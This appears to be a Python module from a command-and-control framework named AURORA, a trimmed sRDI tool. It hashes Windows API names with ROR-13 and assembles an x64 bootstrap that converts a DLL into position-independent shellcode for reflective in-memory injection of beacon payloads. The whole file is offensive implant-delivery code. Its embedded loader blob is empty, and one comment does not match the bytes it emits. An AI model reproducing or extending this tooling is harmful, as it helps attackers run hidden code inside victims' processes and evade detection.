"""
sRDI - Shellcode Reflective DLL Injection (x64 only)

Stripped-down version for AURORA C2: only keeps the functions used by
the teamserver's dll_parser.py:
  - is64BitDLL(bytes)
  - HashFunctionName(name)
  - ConvertToShellcode(dllBytes, functionHash, userData, flags)

The x86 shellcode blob and bootstrap have been removed since AURORA
beacon is x64-only.
"""
import struct
from struct import pack

MACHINE_AMD64 = 34404


def is64BitDLL(bytes):
    header_offset = struct.unpack("<L", bytes[60:64])[0]
    machine = struct.unpack("<H", bytes[header_offset + 4:header_offset + 6])[0]
    return machine == MACHINE_AMD64


ror = lambda val, r_bits, max_bits: \
    ((val & (2**max_bits - 1)) >> r_bits % max_bits) | \
    (val << (max_bits - (r_bits % max_bits)) & (2**max_bits - 1))


def HashFunctionName(name, module=None):
    function = name.encode() + b'\x00'

    if module:
        module = module.upper().encode('UTF-16LE') + b'\x00\x00'

        functionHash = 0
        for b in function:
            functionHash = ror(functionHash, 13, 32)
            functionHash += b

        moduleHash = 0
        for b in module:
            moduleHash = ror(moduleHash, 13, 32)
            moduleHash += b

        functionHash += moduleHash
        if functionHash > 0xFFFFFFFF:
            functionHash -= 0x100000000
    else:
        functionHash = 0
        for b in function:
            functionHash = ror(functionHash, 13, 32)
            functionHash += b

    return functionHash


# ── Pre-compiled RDI shellcode (x64) ──────────────────────────
# This is the PE loader that gets prepended to the DLL bytes.
# It maps sections, fixes relocations, resolves imports, and calls DllMain.

rdiShellcode64 = b''


def ConvertToShellcode(dllBytes, functionHash=0x10, userData=b'None', flags=0):
    """Convert a 64-bit DLL into position-independent shellcode.

    Memory layout of the output:
        [bootstrap]  69-byte x64 shellcode that sets up RDI arguments
        [RDI loader] Pre-compiled PE loader (maps sections, relocs, imports)
        [DLL bytes]  Original DLL file content
        [user data]  Optional data passed to the export function
    """
    if not is64BitDLL(dllBytes):
        raise ValueError("Only 64-bit DLLs are supported")

    bootstrap = b''
    bootstrapSize = 69

    # call next instruction (pushes next instruction address to stack)
    bootstrap += b'\xe8\x00\x00\x00\x00'

    # Set the offset to our DLL from pop result
    dllOffset = bootstrapSize - len(bootstrap) + len(rdiShellcode64)

    # pop rcx - capture our current location in memory
    bootstrap += b'\x59'

    # mov r8, rcx - copy our location in memory to r8
    bootstrap += b'\x49\x89\xc8'

    # mov edx, <functionHash>
    bootstrap += b'\xba'
    bootstrap += pack('I', functionHash)

    # add r8, <offset to user data>
    bootstrap += b'\x49\x81\xc0'
    userDataLocation = dllOffset + len(dllBytes)
    bootstrap += pack('I', userDataLocation)

    # mov r9d, <length of user data>
    bootstrap += b'\x41\xb9'
    bootstrap += pack('I', len(userData))

    # push rsi - save original value
    bootstrap += b'\x56'

    # mov rsi, rsp - store current stack pointer
    bootstrap += b'\x48\x89\xe6'

    # and rsp, 0x0FFFFFFFFFFFFFFF0 - align stack to 16 bytes
    bootstrap += b'\x48\x83\xe4\xf0'

    # sub rsp, 0x38 - create breathing room on stack
    bootstrap += b'\x48\x83\xec\x30'

    # mov qword ptr [rsp + 0x28], rcx (shellcode base) - arg 5
    bootstrap += b'\x48\x89\x4C\x24\x28'

    # add rcx, <offset of the DLL>
    bootstrap += b'\x48\x81\xc1'
    bootstrap += pack('I', dllOffset)

    # mov dword ptr [rsp + 0x20], <flags> - arg 6
    bootstrap += b'\xC7\x44\x24\x20'
    bootstrap += pack('I', flags)

    # call - transfer execution to the RDI loader
    bootstrap += b'\xe8'
    bootstrap += pack('b', bootstrapSize - len(bootstrap) - 4)
    bootstrap += b'\x00\x00\x00'

    # mov rsp, rsi - reset original stack pointer
    bootstrap += b'\x48\x89\xf4'

    # pop rsi - restore
    bootstrap += b'\x5e'

    # ret
    bootstrap += b'\xc3'

    if len(bootstrap) != bootstrapSize:
        raise Exception(
            "x64 bootstrap length: {} != bootstrapSize: {}".format(
                len(bootstrap), bootstrapSize)
        )

    return bootstrap + rdiShellcode64 + dllBytes + userData
